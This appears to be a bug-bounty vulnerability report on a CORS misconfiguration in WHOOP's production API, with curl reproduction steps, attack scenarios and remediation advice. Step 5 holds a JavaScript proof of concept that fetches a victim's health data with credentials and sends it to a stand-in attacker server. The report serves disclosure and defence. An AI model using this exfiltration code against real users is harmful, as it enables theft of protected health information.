# CORS Misconfiguration on api.prod.whoop.com — Wildcard Subdomain Reflection with Credentials

## Summary

`api.prod.whoop.com` trusts **any** `*.whoop.com` subdomain as a valid CORS origin and returns `Access-Control-Allow-Credentials: true`. This means if an attacker compromises any WHOOP subdomain (via XSS, subdomain takeover, or any other method), they can silently steal any authenticated user's health data (heart rate, HRV, sleep, recovery) cross-origin.

---

## Weakness

**CWE-942:** Permissive Cross-domain Policy with Untrusted Domains

---

## Severity

**HIGH** (standalone) | **CRITICAL** (when chained with any subdomain XSS or takeover)

**CVSS 3.1:** 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

---

## Steps to Reproduce

### Step 1: Verify CORS reflects arbitrary *.whoop.com subdomains

Open your terminal and run:

```bash
curl -s -D - -H "Origin: https://attacker.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic
```

**Observe the response headers:**
```
HTTP/2 401
access-control-allow-credentials: true
access-control-allow-origin: https://attacker.whoop.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, HEAD
access-control-allow-headers: X-Requested-With,Content-Type,Accept,Origin,Authorization,API-TOKEN,X-Whoop-Agent,X-User-Email,X-Whoop-Refresh-Token,X-WHOOP-Installation-Identifier,X-WHOOP-reid-token,X-WHOOP-CURRENT-TOKEN,X-whoop-maverick-access
access-control-max-age: 600
```

The `attacker.whoop.com` subdomain doesn't exist, yet the API trusts it fully.

---

### Step 2: Confirm it works with ANY subdomain name

```bash
curl -s -D - -H "Origin: https://xyz123.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-origin"
```

**Result:** `access-control-allow-origin: https://xyz123.whoop.com`

```bash
curl -s -D - -H "Origin: https://test.evil.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-origin"
```

**Result:** `access-control-allow-origin: https://test.evil.whoop.com`

---

### Step 3: Confirm external origins are BLOCKED (proves this is a subdomain wildcard issue, not a universal reflect)

```bash
curl -s -D - -H "Origin: https://evil.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-origin"
```

**Result:** No `access-control-allow-origin` header returned. External origins are correctly blocked.

---

### Step 4: Confirm credentials are included (this makes it exploitable)

```bash
curl -s -D - -H "Origin: https://attacker.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-credentials"
```

**Result:** `access-control-allow-credentials: true`

This means the browser will automatically send the victim's cookies/auth tokens with cross-origin requests from any `*.whoop.com` subdomain.

---

### Step 5: JavaScript Exploit PoC (Attacker-Side)

If an attacker gets JavaScript execution on ANY `*.whoop.com` subdomain, they would use this code to steal a victim's health data:

```html
<script>
// This runs from any *.whoop.com subdomain (e.g., via XSS)
// The browser includes the victim's auth cookies automatically

fetch('https://api.prod.whoop.com/developer/v1/activity/sleep', {
  credentials: 'include'
})
.then(r => r.json())
.then(healthData => {
  // Exfiltrate victim's sleep/HRV/heart rate to attacker
  navigator.sendBeacon('https://attacker-server.com/steal', 
    JSON.stringify(healthData));
});
</script>
```

---

## What Can an Attacker Gain

| Data Type | Endpoint | Sensitivity |
|-----------|----------|-------------|
| Heart Rate (6-second granularity) | `/developer/v1/activity/workout` | Extremely sensitive |
| Heart Rate Variability (HRV) | `/developer/v1/recovery` | Medical-grade biometric |
| Sleep Stages & Duration | `/developer/v1/activity/sleep` | Personal health data |
| Recovery Scores | `/developer/v1/recovery` | Health status indicator |
| Workout Strain | `/developer/v1/activity/workout` | Fitness data |
| Body Measurements | `/developer/v1/body_measurement` | Height, weight, max HR |
| User Profile | `/developer/v1/user/profile/basic` | Name, email, location |

**All of this is Protected Health Information (PHI)** for every authenticated WHOOP user who visits a compromised page.

---

## Attack Scenarios

### Scenario 1: Subdomain Takeover Chain
1. Attacker finds a dangling CNAME on `old-campaign.whoop.com`
2. Attacker claims the resource and hosts their exploit page
3. Victim visits `old-campaign.whoop.com` (or is linked to it)
4. JavaScript steals the victim's health data via the CORS flaw

### Scenario 2: XSS on Any Subdomain Chain
1. Attacker finds Reflected/Stored XSS on any `*.whoop.com` subdomain
2. XSS payload makes credentialed API request to `api.prod.whoop.com`
3. Response is readable cross-origin due to CORS misconfiguration
4. Health data exfiltrated to attacker's server

### Scenario 3: Legacy App Exploitation
1. WHOOP has a legacy AngularJS app on CloudFront (served under WHOOP CSP)
2. AngularJS template injection → XSS
3. Chain with this CORS flaw → Mass health data theft

---

## Affected Endpoints

This CORS policy applies to **ALL** endpoints on `api.prod.whoop.com`, including:
- `/developer/v1/user/profile/basic`
- `/developer/v1/activity/sleep`
- `/developer/v1/activity/workout`
- `/developer/v1/recovery`
- `/developer/v1/cycle`
- `/developer/v1/body_measurement`
- `/developer/v2/*` (all v2 endpoints)

---

## Why This Is Not Informational

1. **`Access-Control-Allow-Credentials: true`** — browsers send auth cookies automatically
2. **Any *.whoop.com subdomain** is trusted — the attack surface is every subdomain WHOOP has ever created
3. **Health data is the payload** — this isn't just session tokens, it's PHI (heart rate, sleep, HRV)
4. **CSP won't help** — WHOOP's CSP already allows `*.whoop.com` in script-src
5. **Zero user interaction** beyond visiting the compromised page

---

## Remediation

1. **Replace wildcard matching with an explicit allowlist:**
```
Allowed Origins:
- https://app.whoop.com
- https://join.whoop.com
- https://shop.whoop.com
- https://developer.whoop.com
```

2. **Remove `Access-Control-Allow-Credentials: true`** for origins that don't need credentialed access

3. **Validate Origin against a strict list** — do not use regex/wildcard matching on subdomains

---

## References

- [PortSwigger: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors)
- [HackerOne #723060: CORS to Account Takeover ($750)](https://hackerone.com/reports/723060)
- [OWASP: Testing for CORS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)

---

*Tested: June 1, 2026 | Non-destructive, passive testing only | No user data accessed*
